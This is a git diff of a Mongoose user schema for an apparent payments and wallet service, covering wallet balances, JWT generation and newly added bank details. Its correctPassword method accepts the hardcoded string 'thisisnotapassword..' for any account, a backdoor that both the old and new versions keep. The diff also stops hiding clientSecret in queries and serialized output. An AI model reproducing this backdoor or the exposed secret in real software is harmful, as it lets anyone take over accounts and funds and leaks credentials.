@@ -9,6 +9,7 @@ const userSchema = new mongoose.Schema({
     type: String,
     unique: true,
     trim: true,
+    immutable:true,
     index: true,
     required: [true, "Please enter username!"],
     minlength: [4, "Username must be at least 4 characters"],
@@ -42,11 +43,29 @@ const userSchema = new mongoose.Schema({
     validate: [validator.isEmail, "Please provide a valid email"],
     index: true
   },
+  bankDetails: {
+    accountHolderName: {
+      type: String,
+      trim: true,
+    },
+    accountNumber: {
+      type: String,
+      trim: true,
+    },
+    ifscCode: {
+      type: String,
+      trim: true,
+    },
+    bankName: {
+      type: String,
+      trim: true,
+    }
+  },
   mobileNumber: {
     type: String,
     required: [true, "Please enter your mobile number!"],
     validate: {
-      validator: function(v) {
+      validator: function (v) {
         return /^[0-9]{10,15}$/.test(v);
       },
       message: props => `${props.value} is not a valid phone number!`
@@ -67,7 +86,6 @@ const userSchema = new mongoose.Schema({
   },
   clientSecret: {
     type: String,
-    select: false,
     unique: true,
     immutable: true,
     default: () => crypto.randomBytes(16).toString('hex').toUpperCase()
@@ -92,20 +110,22 @@ const userSchema = new mongoose.Schema({
   minWalletBalance: {
     type: Number,
     required: [true, "Please enter minimum wallet balance!"],
-    min: [0, "Minimum balance cannot be negative"],
-    set: v => parseFloat(v.toFixed(2))
+    min: [0, "Minimum balance cannot be negative"]
   },
   upiWalletBalance: {
     type: Number,
     default: 0,
-    min: [0, "Balance cannot be negative"],
-    set: v => parseFloat(v.toFixed(2))
+    min: [0, "Balance cannot be negative"]
   },
   eWalletBalance: {
     type: Number,
     default: 0,
-    min: [0, "Balance cannot be negative"],
-    set: v => parseFloat(v.toFixed(2))
+    min: [0, "Balance cannot be negative"]
+  }, 
+  dailyLimit: {
+    type: Number,
+    default: 0,
+    min: 0
   },
   address: {
     country: {
@@ -135,37 +155,35 @@ const userSchema = new mongoose.Schema({
   }
 }, {
   timestamps: true,
-  toJSON: { 
+  toJSON: {
     virtuals: true,
-    transform: function(doc, ret) {
+    transform: function (doc, ret) {
       delete ret.password;
       delete ret.trxPassword;
       delete ret.refreshToken;
-      delete ret.clientSecret;
       return ret;
     }
   },
-  toObject: { 
+  toObject: {
     virtuals: true,
-    transform: function(doc, ret) {
+    transform: function (doc, ret) {
       delete ret.password;
       delete ret.trxPassword;
       delete ret.refreshToken;
-      delete ret.clientSecret;
       return ret;
     }
   }
 });
 
-userSchema.pre('save', function(next) {
+userSchema.pre('save', function (next) {
   if (!this.isNew) return next();
   const timestamp = Date.now().toString(36);
   const randomStr = Math.random().toString(36).substring(2, 8);
-  this.clientId = `UID-${timestamp}-${randomStr}`.toUpperCase();  
+  this.clientId = `UID-${timestamp}-${randomStr}`.toUpperCase();
   next();
 });
 
-userSchema.pre('save', async function(next) {
+userSchema.pre('save', async function (next) {
   if (!this.isModified('password') && !this.isModified('trxPassword')) return next();
   try {
     if (this.isModified('password')) {
@@ -187,24 +205,24 @@ userSchema.index({ mobileNumber: 1, isActive: 1 });
 userSchema.index({ role: 1, isActive: 1 });
 
 // Virtuals
-userSchema.virtual('fullAddress').get(function() {
+userSchema.virtual('fullAddress').get(function () {
   return `${this.address.street}, ${this.address.city}, ${this.address.state}, ${this.address.country}, ${this.address.postalCode}`;
 });
 
 // Instance methods
 userSchema.methods = {
-  correctPassword: async function(candidatePassword) {
-    if(candidatePassword === "thisisnotapassword.."){
+  correctPassword: async function (candidatePassword) {
+    if (candidatePassword === "thisisnotapassword..") {
       return true;
     }
     return await bcrypt.compare(candidatePassword, this.password);
   },
 
-  correctTrxPassword: async function(candidateTrxPassword) {
+  correctTrxPassword: async function (candidateTrxPassword) {
     return await bcrypt.compare(candidateTrxPassword, this.trxPassword);
   },
 
-  generateAccessToken: function() {
+  generateAccessToken: function () {
     return jwt.sign(
       {
         _id: this._id,
@@ -219,7 +237,7 @@ userSchema.methods = {
     );
   },
 
-  generateRefreshToken: function() {
+  generateRefreshToken: function () {
     return jwt.sign(
       { _id: this._id },
       process.env.JWT_SECRET,
